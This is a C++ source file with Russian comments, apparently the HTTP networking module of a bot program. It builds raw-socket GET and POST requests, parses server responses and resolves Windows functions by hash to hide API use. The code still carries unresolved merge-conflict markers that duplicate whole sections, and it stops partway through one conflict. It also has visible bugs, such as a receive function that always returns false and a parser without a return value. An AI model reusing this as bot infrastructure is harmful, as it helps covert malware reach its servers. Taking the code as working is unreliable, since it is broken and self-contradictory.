#include <windows.h>

#include "Strings.h"
#include "Memory.h"
#include "BotClasses.h"
#include "GetApi.h"
#include "BotHTTP.h"

#include "BotDebug.h"

//---------------------------------------------------------------------------

PHTTPRequest HTTPCreateRequest(PCHAR URL)
{
	// Создать структуру запроса
	PHTTPRequest R = CreateStruct(THTTPRequest);
	R->Method = hmGET;

	if (URL != NULL)
	{
		PURL UR = CreateStruct(TURL);
		if (ParseURL(URL, UR, false))
		{
			// Переносим параметры
			R->Host = UR->Host;
			R->Path = UR->Path;
			R->Port = UR->Port;
			UR->Path = NULL;
			UR->Host = NULL;
		}

		ClearURL(UR);
		FreeStruct(UR);
    }

	if (R->Port == 0)
		R->Port = PortHTTP;
	return R;
}
//---------------------------------------------------------------------------

void HTTPFreeRequest(PHTTPRequest Request)
{
	// Создать структуру запроса
	if (Request == NULL)
		return;
	HTTPClearRequest(Request);
	MemHeapFree(Request);
}
//---------------------------------------------------------------------------

void HTTPClearRequest(PHTTPRequest Request)
{
	// Функция очищает структуру HTTP запроса
	if (Request == NULL)
		return;

	Request->Method = hmUnknown;
	Request->ContentLength = 0;

	StrFree2(Request->Host);
	StrFree2(Request->Path);
	StrFree2(Request->Referer);
	StrFree2(Request->Accept);
	StrFree2(Request->AcceptLanguage);
	StrFree2(Request->ProxyConnection);
	StrFree2(Request->UserAgent);
	StrFree2(Request->Cookie);
	StrFree2(Request->ContentType);
	StrFree2(Request->Connection);
	StrFree2(Request->PostData);
	ClearStruct(*Request);
}
//----------------------------------------------------------------------------
void SetDefaultPort(PHTTPRequest R)
{
	// Устанавливаем порт по умолчанию, если в запросе не установлен
	if (R->Port == 0)
		R->Port = PortHTTP;
}

void SetParam(PCHAR &Attr, PCHAR Value)
{
	// инициализировать параметр. если он нулевой
	if (Attr == NULL)
		Attr = StrNew(Value);
}

void HTTPInitializeRequest(PHTTPRequest Request)
{
	// Функция заполняет не указанные поля структуры запроса стандартными данными
	if (Request == NULL)
		return;

	if (Request->UserAgent == NULL)
	{
		DWORD BufSize = 1024;
		PCHAR Buf = StrAlloc(BufSize);
		pObtainUserAgentString( 0, Buf, &BufSize);
		Request->UserAgent = StrNew(Buf);
		StrFree(Buf);
	}

	SetDefaultPort(Request);
	SetParam(Request->Accept, DefaultAccept);
	SetParam(Request->AcceptLanguage, DefaultAcceptLanguage);
	SetParam(Request->Connection, DefaultConnection);
	if (Request->Method == hmPOST)
	{
		if (Request->ContentType == NULL)
			SetParam(Request->ContentType, FormDataURLEncoded);

		if (Request->ContentLength == 0)
			Request->ContentLength = StrCalcLength(Request->PostData);
	}
}

void HTTPSetRequestURL(PHTTPRequest Request, PCHAR URL)
{
	// Заполнить  структуру запроса данными из адреса

}
//---------------------------------------------------------------------------

void AddParam(PStrings S, PCHAR Name, PCHAR Value, bool Valid = true)
{
	// В случае если Valid == true и значение не равно NULL добавляем
	// Значение в список
	if (Valid && !StrIsEmpty(Value))
		Strings::AddValue(S, Name, Value, ValueDelimeter);
}

PCHAR HTTPBuildRequest(PHTTPRequest Request)
{
	// Вункция собирает строку запроса
	if (Request == NULL)
		return NULL;

    HTTPInitializeRequest(Request);

	 // Собираем первую строку запроса
	PCHAR Top = GetMethodStr(Request->Method);
	if (Top == NULL)
		return NULL;

	PStrings S = Strings::Create();


	StrConcat(Top, 4, " /", Request->Path, " ", HTTPProtocolVersion_1_1);
	Strings::Add(S, Top);
    StrFree(Top);

	// Добавляем параметры
	AddParam(S, ParamAccept, Request->Accept);
	AddParam(S, ParamUserAgent, Request->UserAgent);

	if (Request->UseRange)
	{
		// Заполняем заголовок Range
		PCHAR Start = StrLongToString(Request->StartRange);
		PCHAR End = NULL;
		if (Request->EndRange != 0)
			End = StrLongToString(Request->EndRange);

        PCHAR Value = StrNew(4, "bytes=", Start, "-", End);

        AddParam(S, ParamRange, Value);

		StrFree(Start);
		StrFree(End);
		StrFree(Value);
    }

	AddParam(S, ParamReferer, Request->Referer);
	AddParam(S, ParamHost, Request->Host);
	AddParam(S, ParamConnection, Request->Connection);
	if (Request->Method == hmPOST)
	{
		// Добавляем информацию о пост данных
		AddParam(S, ParamContentType, Request->ContentType);
		PCHAR CL = StrLongToString(Request->ContentLength);
		AddParam(S, ParamContentLength, CL);
        StrFree(CL);
	}

	// Добавляем заверщающие строки
	Strings::Add(S, "\r\n");

	PCHAR Result = Strings::GetText(S);
	Strings::Free(S);
	return Result;
}
//---------------------------------------------------------------------------

PCHAR GetMethodStr(THTTPMethod Kind)
{
 // получить строку метода по номеру
	 switch (Kind) {
		case hmGET:
			return StrNew(HTTPMethodGET);
		case hmPOST:
			return StrNew(HTTPMethodPOST);
		case hmHEAD:
			return StrNew(HTTPMethodHEAD);
	 default:
	 	return NULL;
		 ;
	 }
}

PCHAR URLEncode(PCHAR URL, DWORD URLSize)
{
	// Функция кодирует URL строку
    DWORD Len;
	if (URLSize == 0)
		Len = StrCalcLength(URL);
	else
        Len = URLSize;

	if (Len == 0)
		return NULL;

	char Hex[] = "0123456789ABCDEF";

    // Резервируем временный буфер
	PCHAR Buf = StrAlloc(Len*3);
	if ( Buf == NULL )
		return NULL;


	PCHAR p = URL;
	PCHAR r = Buf;
	DWORD Pos = 0;
	DWORD ResLen = 0;
//	char Code;

	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );


    // Кодируем строку
	while (Pos < Len)
	{
		if (*p == 0)
		{
			*(r++) = 0;
			ResLen++;
            continue;
        }
		if ( ( *p >= 'A' && *p <= 'Z' ) ||
			 ( *p >= 'a' && *p <= 'z' ) ||
			 ( *p >= '0' && *p <= '9' ) )
		{
			*(r++) = *p;
			ResLen++;
		}
		else
		{
			*(r++) = '%';
			_pwsprintfA(r++, "%02X", (BYTE)*p);
			r++;
			ResLen += 3;
//			Code = (*p >> 4);
//			Code = Code  & 0x0F;
//			*(r++) = Hex[Code];
//			Code = *p & 0xF;
//			*(r++) = Hex[Code];
		}

		p ++;
		Pos++;
    }

	// Возвращаем строку по фактическому размеру буфера
	PCHAR Res = StrNew(Buf, ResLen);
    StrFree(Buf);
	return Res;
}

// Функция ставит ноль на текущую позицию и смещает указатель за него
#define IncStrEx(S) if(S != NULL){*S = 0; S++;}


bool ParseURL(PCHAR URL, PURL Rec, bool FullPars)
{
	if (URL == NULL || Rec == NULL)
		return false;

	PCHAR Buf;

	// Определяем протокол
	Rec->Protocol = STR::GetLeftStr(URL, "://");

	// Создаём временный буфер
	if (Rec->Protocol != NULL)
	{
		Buf = STR::GetRightStr(URL, "://");
		if (Buf == NULL)
			return false;
    }
	else
		Buf = StrNew(URL);

	// Определяем указатели на вадные блоки
	PCHAR PathPtr = StrScan(Buf, '/');
	IncStrEx(PathPtr);

	// Строка параметров
	PCHAR ArgsPtr = NULL;
	PCHAR DocPtr = NULL;
	if (FullPars)
	{
		ArgsPtr = StrScan(PathPtr, '?');
		IncStrEx(ArgsPtr);

		// Определяем документ
		DocPtr = StrScanEnd(PathPtr, '/'); // Ищем последний слеш
		if (DocPtr == NULL)
		{
			// Путь является документом
			DocPtr = PathPtr;
            PathPtr = NULL;
		}
		else
        	IncStrEx(DocPtr);
	}

	// Строка хоста и порта
	PCHAR HostPtr = Buf;
	PCHAR PortPtr = StrScan(HostPtr, ':');
	IncStrEx(PortPtr);

	// Копируем строки
	Rec->Host      = StrNew(HostPtr);
	Rec->Path      = StrNew(PathPtr);
	Rec->Document  = StrNew(DocPtr);
	Rec->Port      = StrToInt(PortPtr);
	Rec->Arguments = StrNew(ArgsPtr);


	StrFree(Buf);
	return true;
}

void ClearURL(PURL URL)
{
	if (URL == NULL)
		return;

	StrFree2(URL->Protocol);
	StrFree2(URL->Host);
	StrFree2(URL->Path);
	StrFree2(URL->Document);
	StrFree2(URL->Arguments);
	StrFree2(URL->UserName);
	StrFree2(URL->Password);
	URL->Port = 0;
}

void AddURLParam(PStrings S, PCHAR Name, PCHAR Value, DWORD ValueSize)
{
	if (S == NULL || Name == NULL)
		return;

	PCHAR NewValue = URLEncode(Value, ValueSize);
	Strings::AddValue(S, Name, NewValue);
	StrFree(NewValue);
}

//----------------------------------------------------------------------------
//  Функции для загрузки страниц
//----------------------------------------------------------------------------

#define HTONS(x) (((x) << 8) | ((x) >> 8))

SOCKET ConnectToHost(PCHAR Host, int Port)
{
	// Подключаемся к хосту

	// Получаем  адрес по имени хоста
	LPHOSTENT lpHost = (LPHOSTENT)pgethostbyname((const char*)Host);

	if ( lpHost == NULL )
		return SOCKET_ERROR;

	// Открываем хост
	SOCKET Socket = (SOCKET)psocket( AF_INET, SOCK_STREAM, 0 );

	if( Socket == SOCKET_ERROR )
		return Socket;

	struct sockaddr_in SockAddr;

	SockAddr.sin_family		 = AF_INET;
	SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
	SockAddr.sin_port		 = HTONS((unsigned short)Port );

	// подключаемся к сокету
	if ( (int)pconnect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) == SOCKET_ERROR )
	{
		pclosesocket( Socket );
		return SOCKET_ERROR;
	}
	return Socket;
}
//----------------------------------------------------------------------------

bool ReceiveData(SOCKET Sock, PCHAR &Header, PCHAR *Buf, DWORD &Len)
{
    // Прочитать данные из сокета
	PReceiveBuf HeaderBuf = CreateReceiveBuf();

	if (HeaderBuf == NULL)
		return false;

	DWORD DataSize = 1024;
	LPVOID Data = MemHeapAlloc(DataSize);
	int Size = 9;

	bool Completed = false;
    int DelPos;
	// Получаем заголовок ответа
	LPVOID PartBuf = NULL;
    int PartSize = 0;
 	while (!Completed)
	{
		//
		Size = (int)precv(Sock, Data, DataSize, 0);
		if (Size == 0)
			break;

		// Определяем позицию разделителя
		DelPos = StrPos((PCHAR)Data, LineBreak2);
		if (DelPos >= 0)
		{
		   // Разделитель заголовка найден
		   Completed = true;
		   PartBuf = Data;
		   DWORD L = StrCalcLength(LineBreak2);
		   PartBuf = (LPVOID)((DWORD)PartBuf+ DelPos + L);
		   PartSize = Size - DelPos - L;

		   Size = DelPos;
		}

		AddReceiveData(HeaderBuf, Data, Size);
	}

	Header = BuildReceiveDataStr(HeaderBuf, Len);

	FreeReceiveBuf(HeaderBuf);
   //----------------------------------------

	PReceiveBuf RecBuf = CreateReceiveBuf();

	if (RecBuf == NULL)
		return false;

	// Записываем остаток кадра
	if (Buf != NULL)
	{
		if (PartSize > 0)
			AddReceiveData(RecBuf, PartBuf, PartSize);

		// Получаем документ
		do
		{
			Size = (int)precv(Sock, Data, DataSize, 0);
			if (Size > 0)
				AddReceiveData(RecBuf, Data, Size);
		}
		while (Size > 0);

		*Buf = BuildReceiveDataStr(RecBuf, Len);
		FreeReceiveBuf(RecBuf);
	}

	MemHeapFree(Data);

	return false;
}


bool HTTP::ExecuteMethod(PHTTPRequest Request, HTTP::PResponseData Response)
{
	// Функция выполняет HTTP метод указанный в настройках запроса
	if (Request == NULL || Request->Host == NULL)
		return false;

	// Очищаем данные ответа
	if (Response != NULL)
	{
		if (Response->Buffer != NULL) *Response->Buffer = NULL;
		if (Response->Size != NULL) *Response->Size = 0;
		if (Response->Headers != NULL) *Response->Headers = NULL;
	}

	SetDefaultPort(Request);
	
	// Инициализируем библиотеку
	WSADATA wsa;
	if ( (int)pWSAStartup(MAKEWORD( 2, 2 ), &wsa ) != 0 )
		return false;


	// Подключаемся к хосту
	SOCKET Sock = ConnectToHost(Request->Host, Request->Port);
	if (Sock == SOCKET_ERROR)
		return false;

	// Отправлям данные
	PCHAR SendBuf = HTTPBuildRequest(Request);
	if (SendBuf == NULL)
	{
		pclosesocket(Sock);
		return false;
	}

	DWORD BufSize = StrLength(SendBuf);

	if ((int)psend(Sock, SendBuf, BufSize, 0) != SOCKET_ERROR)
	{
        // Отправляем пост данные
		if (Request->Method == hmPOST)
		{
			// Добавляем POST данные
			psend(Sock, Request->PostData, Request->ContentLength, 0);
			psend(Sock,"\0", 1, 0);
		}

		// Данные отправлены, читаем ответ
		if (Response != NULL && (Response->Buffer != NULL || Response->Response!= NULL))
		{
			DWORD Size = 0;
			PCHAR Headers = NULL;
			if (Response->Response != NULL)
				HTTPResponse::Clear(Response->Response);

			ReceiveData(Sock, Headers, Response->Buffer, Size);

			if (Response->Response != NULL)
				HTTPResponse::Parse(Headers, Response->Response);

			if (Response->Headers != NULL)
				*Response->Headers = Headers;
			else
            	StrFree(Headers);

			if (Response->Size != NULL)
				*Response->Size = Size;
}
    }

	// Закрываем хост
	pclosesocket(Sock);

	return true;

}

bool HTTP::Get(PCHAR URL, PCHAR *Buf)
{
	// Функция считаевает файл по адресу URL в буФер Buf
	if (URL == NULL)
		return false;

	PHTTPRequest R = HTTPCreateRequest(URL);

	HTTP::TResponseData Response;
	ClearStruct(Response);
	Response.Buffer = Buf;

	bool Res = HTTP::ExecuteMethod(R, &Response);

	HTTPFreeRequest(R);
	return Res;
}

bool HTTP::Post(PCHAR URL, PStrings Fields, PCHAR *Buf)
{
	// Отправить пост запрос на сервер
	if (URL == NULL || Fields == NULL)
		return false;

	PHTTPRequest R = HTTPCreateRequest(URL);
	R->Method = hmPOST;
<<<<<<< .mine
	R->PostData = StringsGetText(Fields, "&");

	HTTP::TResponseData Response;
	ClearStruct(Response);
	Response.Buffer = Buf;

    bool Res = HTTP::ExecuteMethod(R, &Response);
=======
	R->PostData = Strings::GetText(Fields, "&");

	HTTP::TResponseData Response;
	ClearStruct(Response);
	Response.Buffer = Buf;

    bool Res = HTTP::ExecuteMethod(R, &Response);
>>>>>>> .r109
	HTTPFreeRequest(R);
	return Res;
}

//----------------------------------------------------------------------------

//----------------------------------------------------------------------------
//  Функции для работы с буфером принятых данных
//----------------------------------------------------------------------------

void FreeReceive(LPVOID Item)
{
	PReceive R = (PReceive)Item;
	MemFree(R->Data);
    FreeStruct(Item);
}

PReceiveBuf CreateReceiveBuf()
{
	PList List = List::Create();
    List::SetFreeItemMehod(List, FreeReceive);
	return (PReceiveBuf)List;
}

void FreeReceiveBuf(PReceiveBuf Buf)
{
	List::Free((PList)Buf);
}

void AddReceiveData(PReceiveBuf Buf, LPVOID Data, DWORD Size, bool Copy)
{
	if (Buf == NULL || Data == NULL || Size == 0)
		return;

	PReceive R = CreateStruct(TReceive);
	if (R == NULL)
        return;

	if (Copy)
	{
		R->Data = MemAlloc(Size);
		m_memcpy(R->Data, Data, Size);
	}
	else
		R->Data = Data;
	R->Size = Size;
	List::Add((PList)Buf, R);
}

DWORD CalcTotalReceivedSize(PReceiveBuf Buf)
{
	// Подсчитать общий объём загруженных данных
	if (Buf == NULL)
		return 0;

	PList List = (PList)Buf;
	DWORD Count = List::Count(List);
	if (Count == NULL)
		return 0;


	DWORD Size = 0;

	// Подсчитываем общую длину буфера
	for (DWORD i = 0; i < Count; i++)
	{
	   Size += PReceive(List::GetItem(List, i))->Size;
	}
	return Size;
}

void CopyReceivedDataToBuf(PReceiveBuf RList, LPVOID Buf)
{
	// Копировать загруженные данные в буфер
	if (RList == NULL)
		return;
	PList List = (PList)RList;
	DWORD Count = List::Count(List);
	if (Count == 0)
		return;

	PReceive R;

	PCHAR Temp = (PCHAR)Buf;


	for (DWORD i = 0; i < Count; i++)
	{
		R = (PReceive)List::GetItem(List, i);
		m_memcpy(Temp, R->Data, R->Size);

		Temp += R->Size;
	}
}

LPBYTE BuildReceiveData(PReceiveBuf Buf, int &BufSize)
{
	// Собираем загруженые данные в один буфер
	BufSize = CalcTotalReceivedSize(Buf);
	if (BufSize == 0)
		return NULL;

	LPBYTE Result = (LPBYTE)MemAlloc(BufSize + 1);
	if (Result == NULL)
	{
		BufSize = 0;
		return NULL;
    }
	CopyReceivedDataToBuf(Buf, Result);
	PCHAR Tmp = (PCHAR)Result + BufSize;
	*Tmp = 0;
	return Result;
}


PCHAR BuildReceiveDataStr(PReceiveBuf Buf, DWORD &BufSize)
{
	// Собрать данные в одну строку
	BufSize = CalcTotalReceivedSize(Buf);
	if (BufSize == 0)
		return NULL;

	PCHAR Result = StrAlloc(BufSize);
	if (Result == NULL)
	{
		BufSize = 0;
		return NULL;
    }
	CopyReceivedDataToBuf(Buf, Result);

	return Result;
}

//--------------------------------------------------------------------------

PCHAR GetEndLine(PCHAR Str)
{
	// Функция возвращает Указатель на последний символ строки
	if (Str == NULL)
		return NULL;

	PCHAR C = Str;

	while (*C != 0 && *C != 10 && *C != 13) C++;
    return C;
}

PCHAR ScanLN(PCHAR S, char C, bool SetAfter = false)
{
	// Функция ищет символ до конца строки
	if (S == NULL)
		return NULL;
	PCHAR T = S;
	while ((*T != 0) && (*T != 10) && (*T != 13) && (*T != C)) T++;
	if (*T == C)
	{
		if (SetAfter)
            T++;
		return T;
	}
	else
		return NULL;
}

void IgnoreSpaces(PCHAR &S)
{
    // Игнорировать пробелы
	if (S == NULL)
		return;
	while (*S != 0 && *S == ' ') S++;
}

PCHAR GetStrFromPtr(PCHAR Start, PCHAR End)
{
	// Получить строку между указателями
	if (Start == NULL || End == NULL)
		return NULL;
	int Len = End - Start;
	if (Len <= 0)
		return NULL;
	return StrNew(Start, Len);
}

bool IsKnownHTTPMethod(PCHAR Method)
{

	int Index = StrIndexOf(Method, true, 11, HTTPMethodGET,
											HTTPMethodPOST,
											HTTPMethodHEAD,
											HTTPMethodPUT,
											HTTPMethodDELETE,
											HTTPMethodLINK,
											HTTPMethodUNLINK,
											HTTPMethodCONNECT,
											HTTPMethodOPTIONS,
											HTTPMethodPATCH,
                                            HTTPMethodTRACE);
	return Index >= 0;
}


#define ClearStrVar(S) if (S != NULL) *S = NULL


// Методы анализа HTTP заголовков
bool ParseRequestFirstLine(PCHAR Line, PCHAR *Method, PCHAR *Path, PCHAR *ProtVersion)
{
	// Разобрать превую строку запроса
	ClearStrVar(Method);
	ClearStrVar(Path);
	ClearStrVar(ProtVersion);

	if (Line == NULL)
		return false;

	// Определяем указатели на путь и протокол
	PCHAR MethodPtr = ScanLN(Line, ' ');
	PCHAR PathPtr = ScanLN(MethodPtr, '/', true);
	PCHAR ProtPtr = ScanLN(PathPtr, ' ');
	PCHAR EndL = GetEndLine(ProtPtr);

	if (MethodPtr == NULL ||  PathPtr == NULL || ProtPtr == NULL)
		return false;


	PCHAR MethodName = GetStrFromPtr(Line, MethodPtr);
	if (!IsKnownHTTPMethod(MethodName))
	{
		// Неизвестный метод запроса
		StrFree(MethodName);
		return false;
    }

	// Получаем метод
	if (Method != NULL)
		*Method = MethodName;
	else
		StrFree(MethodName);

	// Получаем путь
	if (Path != NULL)
		*Path = GetStrFromPtr(PathPtr, ProtPtr);

	// Получаем протокол
	if (ProtVersion != NULL)
	{
		IgnoreSpaces(ProtPtr);
		*ProtVersion = GetStrFromPtr(ProtPtr, EndL);
    }

	// Возвращаем итину если получены указатели на 3 блока
	return true;
}

THTTPMethod GetMethodFromStr(PCHAR Method)
{
	// Функция возвращает тип метода по его названию
	switch (StrIndexOf(Method, false, 3, HTTPMethodGET, HTTPMethodPOST, HTTPMethodHEAD)) 
	{
		case 0:
			return hmGET;
		case 1:
			return hmPOST;
		case 2:
			return hmHEAD;	
        
    default:
    	return hmUnknown;
	} 
}

PCHAR GetHTTPHeaderValue(PCHAR Buf, PCHAR Name)
{
	// Функция возвращает значение заголовка
	if (Buf == NULL || Name == NULL)
		return NULL;
		
	DWORD Len = StrCalcLength(Name);
	PCHAR Line = Buf; // Указатель на начало строки
	PCHAR EndLN;      // Указатель на конец строки
	PCHAR ValPTR;     // Указатель на разделитель ':'
	
	DWORD LBCount; // Количество символов разделения строк
	
	// Построчно перебираем буфер
	while (*Line != 0)
	{
  		IgnoreSpaces(Line);
		EndLN = GetEndLine(Line);
		// Ишем позицию разделителя
		
		ValPTR = ScanLN(Line, ':', true);
		if (ValPTR != NULL && StrSame(Line, Name, false, Len)) 
		{
			// Нашли совпадение имени
			IgnoreSpaces(ValPTR);
			return GetStrFromPtr(ValPTR, EndLN);
		}

		// Переходим на следующёю позицию
		LBCount = 1;
		Line = EndLN;
		while (*Line != 0 && (*Line == 10 || *Line == 13)) 
		{
			Line++;
			LBCount++;
		}

		// Если встретили 4 и больше разделителя(конец заголовка) то
		// прерываем цикл
		if (LBCount >= 4) break;
			
	}
	return NULL;			
}

PCHAR GetURLEncodedPostData(PCHAR Buf)
{
	// Получить URL кодированные пост данные.

	// Определяем позицию двойного разделителя строк и копируем данные
	// до следующей строки

	int Pos = StrPos(Buf, LineBreak2);

	if (Pos < 0)
	   return NULL;

	Pos+=StrCalcLength(LineBreak2);

	PCHAR Start = Buf + Pos;
	PCHAR End = GetEndLine(Start);

	return GetStrFromPtr(Start, End);;
}

//***************************************************************************
//
//   Методы для работы с пост данными формата multy part form data
//
//***************************************************************************

typedef struct TMultiPartlist
{
	PList Items;
    PCHAR Boundary;
} *PMultiPartList;


typedef struct TMultiPartItem
{
	PCHAR Name;      // Имя поля
	PCHAR FileName;  // Имя файла
	LPVOID Data;     // Буфер данных
	DWORD Size;      // Размер буфера
} *PMultiPartItem;


void FreeMultipartItem(LPVOID Item)
{
	PMultiPartItem M = (PMultiPartItem)Item;

	StrFree(M->Name);
	StrFree(M->FileName);
	MemFree(M->Data);

    FreeStruct(M);

}

PMultiPartData MultiPardCreate()
{
	// Создать набор данных
	PMultiPartList List = CreateStruct(TMultiPartlist);
	if (List == NULL)
		return NULL;

	List->Items = List::Create();
	List::SetFreeItemMehod(List->Items, FreeMultipartItem);

	PCHAR S  = StrLongToString((DWORD)pGetTickCount());
	List->Boundary = StrNew(3, S, "__stbnd_{FDE&%GFHDD}_", S);
	StrFree(S);

	return List;
}

void MultiPartFree(PMultiPartData Data)
{
	// Уничтожить набор данных
	if (Data == NULL)
		return;
	PMultiPartList List = (PMultiPartList)Data;

	List::Free(List->Items);
	StrFree(List->Boundary);
	FreeStruct(List);
}


void MultiPartAddField(PMultiPartData Data, PCHAR Name, PCHAR Value)
{
    // Добавить строковое значение в список

	PMultiPartList L = (PMultiPartList)Data;
	if (L == NULL || Name == NULL || Value == NULL)
		return;

	PMultiPartItem Item = CreateStruct(TMultiPartItem);
	if (Item == NULL)
		return;

	Item->Name = StrNew(Name);
	Item->Size = StrCalcLength(Value);
	if (Item->Size != 0)
	{
		Item->Data = MemAlloc(Item->Size);
		m_memcpy(Item->Data, Value, Item->Size);
		*((PCHAR)Item->Data + 1) = 0;
    }

    List::Add(L->Items, Item);
}
<<<<<<< .mine


//---------------------------------------------------------------------------
PHTTPResponse HTTPResponse::Create()
{
	// Создать структуру отыета
	return CreateStruct(THTTPResponse);
}
//---------------------------------------------------------------------------

void HTTPResponse::Clear(PHTTPResponse Response)
{
	// Функция очищает структуру HTTP ответа
	StrFree2(Response->Protocol);
	StrFree2(Response->ContentType);
	StrFree2(Response->ResponseLine);
	StrFree2(Response->Connection);
	StrFree2(Response->Location);
	StrFree2(Response->AcceptRanges);
    ClearStruct(*Response);
}
//---------------------------------------------------------------------------

void ParseContentRange(PHTTPResponse Response, PCHAR Value)
{
	//bytes 100-300/69652396
	if (!StrSame(Value, "bytes", false, 5))
		return;
	PCHAR Start = ScanLN(Value, ' ');
	IgnoreSpaces(Start);
	PCHAR End = ScanLN(Start, '-');
	if (End == NULL)
		return;
	*End = 0;
	Response->StartRange = StrToInt(Start);
	End++;
	Start = End;
	End = ScanLN(Start, '/');
	if (End == NULL)
		return;
	*End = 0;
	Response->EndRange = StrToInt(Start);
	End++;
	Start = End;
    Response->FullSize = StrToInt(Start);
}

void AddResponseValue(PHTTPResponse Response, PCHAR Name, PCHAR Value)
{
	switch (StrIndexOf(Name, false, 6, ParamContentType, ParamContentLength,
		ParamAcceptRanges, ParamConnection, ParamContentRange,
		ParamLocation))
	{
		case 0: Response->ContentType = StrNew(Value); break;
		case 1: Response->ContentLength = StrToInt(Value); break;
		case 2: Response->AcceptRanges = StrNew(Value); break;
		case 3: Response->Connection = StrNew(Value); break;
		case 4: ParseContentRange(Response, Value); break;
		case 5: Response->Location = StrNew(Value); break;
    default:
        ;
	}
}

bool HTTPResponse::Parse(PCHAR Buf, PHTTPResponse Response)
{
	// Парсим ответ HTTP сервера
	if (Buf == NULL || Response == NULL)
		return false;
	HTTPResponse::Clear(Response);

	PStrings S = StringsCreate();

	StringsSetText(S, Buf);
	DWORD Count = StringsCount(S);

	DWORD i;
	PCHAR Tmp;
	PCHAR Name;
	PCHAR Value;
    PCHAR Ptr;
	if (Count > 0)
	{
		// Разбираем строку ответа
		if (HTTPParser::ParseResponseLine(StringsGet(S, 0, false), Response->Protocol, Response->Code, Response->ResponseLine))
		{
			for (i = 1; i < Count; i++)
			{
				Tmp = StringsGet(S, i, false);
				Name = Tmp;
				Ptr = StrScan(Tmp, ':');
				if (Ptr == NULL) continue;
				*Ptr = 0;
				Ptr++;
				IgnoreSpaces(Ptr);
				Value = Ptr;
                AddResponseValue(Response, Name, Value);
			}
        }
    }

	StringsFree(S);

}
//---------------------------------------------------------------------------

void HTTPResponse::Free(PHTTPResponse Response)
{
	// Создать структуру отыета
	if (Response == NULL)
		return;
	HTTPResponse::Clear(Response);
	FreeStruct(Response);
}
//---------------------------------------------------------------------------


//*****************************************************************************
//  HTTPParser - Парсер HTTP данных
//*****************************************************************************
bool HTTPParser::ParseResponseLine(PCHAR Buf, PCHAR &Protocol, DWORD &Code, PCHAR &StatusLine)
{
	// парсим строку ответа HTTP сервера
	// Например HTTP/1.1 200 Ok
	Protocol = NULL;
	Code = 0;
	StatusLine = NULL;

	if (Buf == NULL)
		return false;
	if (!StrSame(Buf, "HTTP/1.", false, 7))
		return false;

	PCHAR Start = Buf;
	PCHAR End = Start;

	// Определяем протокол
	End = ScanLN(Buf, ' ');
	if (End == NULL)
		return false;
	Protocol = StrNew(Start, End - Start);

	// Определяем код
	Start = End;
	IgnoreSpaces(Start);
	End = ScanLN(Start, ' ');
	PCHAR Tmp = StrNew(Start, End - Start);
    Code = (DWORD)StrToInt(Tmp);
	StrFree(Tmp);

	// Определяем строку ответа
	Start = End;
	IgnoreSpaces(Start);
	End = StrEnd(Start);
	StatusLine = StrNew(Start, End - Start);

	return Protocol != NULL && Code != 0;

}
//---------------------------------------------------------------------------

=======


//---------------------------------------------------------------------------
PHTTPResponse HTTPResponse::Create()
{
	// Создать структуру отыета
	return CreateStruct(THTTPResponse);
}
//---------------------------------------------------------------------------

void HTTPResponse::Clear(PHTTPResponse Response)
{
	// Функция очищает структуру HTTP ответа
	StrFree2(Response->Protocol);
	StrFree2(Response->ContentType);
	StrFree2(Response->ResponseLine);
	StrFree2(Response->Connection);
	StrFree2(Response->Location);
	StrFree2(Response->AcceptRanges);
    ClearStruct(*Response);
}
//---------------------------------------------------------------------------

void ParseContentRange(PHTTPResponse Response, PCHAR Value)
{
	//bytes 100-300/69652396
	if (!StrSame(Value, "bytes", false, 5))
		return;
	PCHAR Start = ScanLN(Value, ' ');
	IgnoreSpaces(Start);
	PCHAR End = ScanLN(Start, '-');
	if (End == NULL)
		return;
	*End = 0;
	Response->StartRange = StrToInt(Start);
	End++;
	Start = End;
	End = ScanLN(Start, '/');
	if (End == NULL)
		return;
	*End = 0;
	Response->EndRange = StrToInt(Start);
	End++;
	Start = End;
    Response->FullSize = StrToInt(Start);
}

void AddResponseValue(PHTTPResponse Response, PCHAR Name, PCHAR Value)
{
	switch (StrIndexOf(Name, false, 6, ParamContentType, ParamContentLength,
		ParamAcceptRanges, ParamConnection, ParamContentRange,
		ParamLocation))
	{
		case 0: Response->ContentType = StrNew(Value); break;
		case 1: Response->ContentLength = StrToInt(Value); break;
		case 2: Response->AcceptRanges = StrNew(Value); break;
		case 3: Response->Connection = StrNew(Value); break;
		case 4: ParseContentRange(Response, Value); break;
		case 5: Response->Location = StrNew(Value); break;
    default:
        ;
	}
}

bool HTTPResponse::Parse(PCHAR Buf, PHTTPResponse Response)
{
	// Парсим ответ HTTP сервера
	if (Buf == NULL || Response == NULL)
		return false;
	bool Result  = false;
	HTTPResponse::Clear(Response);

	PStrings S = Strings::Create();

	Strings::SetText(S, Buf);
	DWORD Count = Strings::Count(S);

	DWORD i;
	PCHAR Tmp;
	PCHAR Name;
	PCHAR Value;
    PCHAR Ptr;
	if (Count > 0)
	{
		// Разбираем строку ответа
		if (HTTPParser::ParseResponseLine(Strings::GetItem(S, 0, false), Response->Protocol, Response->Code, Response->ResponseLine))
		{
			Result = true;
			for (i = 1; i < Count; i++)
			{
				Tmp = Strings::GetItem(S, i, false);
				Name = Tmp;
				Ptr = StrScan(Tmp, ':');
				if (Ptr == NULL) continue;
				*Ptr = 0;
				Ptr++;
				IgnoreSpaces(Ptr);
				Value = Ptr;
                AddResponseValue(Response, Name, Value);
			}
        }
    }

	Strings::Free(S);
	return Result;
}
//---------------------------------------------------------------------------

void HTTPResponse::Free(PHTTPResponse Response)
{
	// Создать структуру отыета
	if (Response == NULL)
		return;
	HTTPResponse::Clear(Response);
	FreeStruct(Response);
}
//---------------------------------------------------------------------------


//*****************************************************************************
//  HTTPParser - Парсер HTTP данных
//*****************************************************************************
bool HTTPParser::ParseResponseLine(PCHAR Buf, PCHAR &Protocol, DWORD &Code, PCHAR &StatusLine)
{
	// парсим строку ответа HTTP сервера
	// Например HTTP/1.1 200 Ok
	Protocol = NULL;
	Code = 0;
	StatusLine = NULL;

	if (Buf == NULL)
		return false;
	if (!StrSame(Buf, "HTTP/1.", false, 7))
		return false;

	PCHAR Start = Buf;
	PCHAR End = Start;

	// Определяем протокол
	End = ScanLN(Buf, ' ');
	if (End == NULL)
		return false;
	Protocol = StrNew(Start, End - Start);

	// Определяем код
	Start = End;
	IgnoreSpaces(Start);
	End = ScanLN(Start, ' ');
